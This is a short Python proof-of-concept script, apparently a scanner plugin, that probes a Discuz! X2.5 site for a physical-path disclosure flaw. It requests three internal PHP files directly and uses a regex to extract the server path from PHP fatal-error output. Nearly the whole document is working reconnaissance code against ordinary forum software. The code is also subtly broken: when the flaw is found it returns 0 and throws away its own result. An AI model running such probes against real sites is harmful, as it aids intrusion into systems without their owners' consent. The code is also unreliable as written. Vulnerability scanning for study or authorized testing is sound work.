#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: discuz! X2.5 物理路径泄露漏洞
referer: http://www.uedbox.com/discuzx25-explosive-path/
author: Lucifer
description: 报错导致路径泄露。
'''
import re
import sys
import requests
import warnings
def run(url):
        result = ['discuz! X2.5 物理路径泄露漏洞', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/uc_server/control/admin/db.php",
                    "/source/plugin/myrepeats/table/table_myrepeats.php",
                    "/install/include/install_lang.php"]
        try:
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                pattern = re.search('Fatal error.* in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
                if pattern:
                    result[2]=  '存在'
                    result[1] = vulnurl+"\tGet物理路径: "+pattern.group(1)
                    return 0
            result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
